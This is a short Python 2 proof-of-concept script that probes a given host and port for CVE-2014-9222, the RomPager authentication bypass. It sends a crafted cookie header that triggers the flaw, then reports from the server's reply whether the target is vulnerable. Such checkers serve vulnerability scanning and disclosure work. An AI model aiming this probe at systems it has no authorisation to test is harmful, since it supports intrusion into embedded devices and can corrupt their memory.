import sys
import socket
import traceback
import time
import httplib

def check_status(host, port):

	status = False

	try:
		conn = httplib.HTTPConnection(host, port, timeout=2)
		conn.request("GET", "/")
		status = True

	except:
		status = False

	finally:
		conn.close()

	return status

def CVE_2014_9222(host, port):

	if check_status(host, port):

		print "[-] Target alive, send the HTTP PoC Packet"

		try:
			conn = httplib.HTTPConnection(host, port)
			headers = {"Cookie": "C107373883=/OnwardSecurity"}
			conn.request("GET", "/", "", headers)

			rs = conn.getresponse()
			data = rs.read()
			print data
			if (rs.status == 404) and ("OnwardSecurity" in data):
				print "[-] It's vulnerable for CVE-2014-9222"
			else:
				print "[-] Return %d, it's not vulnerable" % rs.status

		except:
			print "[-] Erros:"
			traceback.print_exc()

		finally:
			conn.close()

	else:
		print "[-] The target is already down before we test"
		return

if __name__ == '__main__':
	
	if len(sys.argv) == 3:		
		host = sys.argv[1]
		port = int(sys.argv[2])

		print "[*] Check for CVE-2014-9222 (Authentication Bypass) "
		CVE_2014_9222(host, port)

	else:
		print "=== RomPager CVE-2014-9222 PoC ==="
		print " Usage: python %s <ip> <port>" % sys.argv[0]
